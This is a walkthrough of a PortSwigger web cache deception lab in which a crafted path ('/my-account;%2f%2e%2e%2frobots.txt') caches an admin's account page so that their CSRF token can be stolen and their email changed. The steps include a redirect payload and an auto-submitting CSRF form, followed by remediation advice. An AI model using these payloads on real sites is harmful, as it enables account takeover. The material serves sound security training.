# Lab: Exploiting Exact-Match Cache Rules for Web Cache Deception

**Category:** Web Cache Deception
**Difficulty:** Practitioner
**Lab link:** [Exploiting exact-match cache rules for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules)

## Overview

The cache stores responses only for exact file names (e.g. `/robots.txt`). Two discrepancies are chained to steal the admin's CSRF token and perform an account takeover:

1. **Delimiter discrepancy:** The origin treats `;` as a path delimiter — `/my-account;anything` is routed to `/my-account`. The cache does not treat `;` as a delimiter — it sees the full path.
2. **Path normalization discrepancy:** The cache resolves `%2f%2e%2e%2f` (encoded `/../`) before applying its exact-match rule. The origin does not, so it ignores the traversal.

Combining both: `/my-account;%2f%2e%2e%2frobots.txt` — the origin returns the authenticated account page (with CSRF token); the cache resolves to `/robots.txt` and stores it.

## Goal

Change the `administrator`'s email address by stealing their CSRF token from a cached response.

## Key Concepts

- **Exact-match cache rule:** Cache stores only specific file names like `/robots.txt`, not directory prefixes — different from `/resources`-style rules.
- **`;` delimiter:** The origin treats `;` as a path separator (common in Java/servlet frameworks); the cache does not.
- **CSRF token theft via cache deception:** The cached page contains the admin's CSRF token in a hidden form field — readable by anyone who fetches the cached URL.
- **Token validity:** CSRF tokens in this lab are session-bound but do not rotate on each page load — the same token is valid across multiple cached responses.
- **Different email required:** If the CSRF attack was silently applied before (token submitted successfully but lab not yet solved), the email is already changed — use a different target email on subsequent attempts.

## Exploit Path

```
/my-account;%2f%2e%2e%2frobots.txt?wcd
```

- **Origin sees:** `/my-account` → returns authenticated account page with CSRF token
- **Cache sees:** resolves to `/robots.txt` → matches exact-match rule → caches it

## Solution

### Step 1 — Find the delimiter

Intruder Sniper on `/my-account§§abc` with the lab's delimiter list (URL-encoding off). `;` returns 200 with account data → it's a valid delimiter.

### Step 2 — Confirm exact-match cache rule

```
GET /robots.txt  (twice)
```
`X-Cache: miss` → `hit` → cached by exact filename.

### Step 3 — Confirm cache resolves ..%2f

```
GET /aaa/..%2frobots.txt  (twice)
```
`X-Cache: miss` → `hit` → cache normalises the dot-segment.

### Step 4 — Build and test exploit path

```
GET /my-account;%2f%2e%2e%2frobots.txt?wcd
```
Logged in as wiener: origin returns account page, cache stores it. Second send: `X-Cache: hit`.

### Step 5 — Poison admin's cache entry

Exploit server body:
```html
<script>document.location="https://<lab>/my-account;%2f%2e%2e%2frobots.txt?wcd"</script>
```
Deliver to victim → admin's account page (including their CSRF token) is cached.

### Step 6 — Steal the CSRF token

In Repeater (not browser — `validateSession` redirects browsers to login), fetch:
```
GET /my-account;%2f%2e%2e%2frobots.txt?wcd
```
within 30 seconds. Copy the `csrf` token value from the hidden input field.

### Step 7 — Build CSRF PoC

Use Burp's "Generate CSRF PoC" on `POST /my-account/change-email`. Replace the CSRF token with the admin's stolen token. Use a **unique target email** each attempt — if a previous attempt silently succeeded, the email is already changed and reusing the same address will not solve the lab.

```html
<html>
  <body>
    <form action="https://<lab>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="csrf" value="ADMIN_CSRF_TOKEN" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### Step 8 — Deliver and solve

Store the CSRF PoC on the exploit server and deliver to victim. Admin's browser auto-submits the form with their session, changing their email. Lab solved.

## Troubleshooting

- **Lab not solving with correct token:** The email was already changed by a previous silent attempt — change to a different target email.
- **Token appears stale:** Re-do steps 5–6 with a new cache buster (`?wcd2`, `?wcd3`) to get a fresh cached entry. The token is session-bound and does not rotate, so if the admin's session is active the token remains valid.
- **Fetching in browser redirects to login:** Expected — `validateSession` runs client-side. Use Repeater without a session cookie instead.

## Remediation

- Apply `Cache-Control: no-store` or `private` to all authenticated responses.
- Do not apply caching rules to paths containing encoded path traversal sequences (`%2f`, `%2e`).
- Strip or reject `;` and other non-standard delimiter characters from paths before routing.

## Key Takeaways

- Exact-match rules are not safer than prefix rules — normalization discrepancies still apply.
- CSRF token theft via cache deception enables account takeover without XSS.
- Always try a different email if the lab doesn't solve — a silent earlier success may have already changed it.
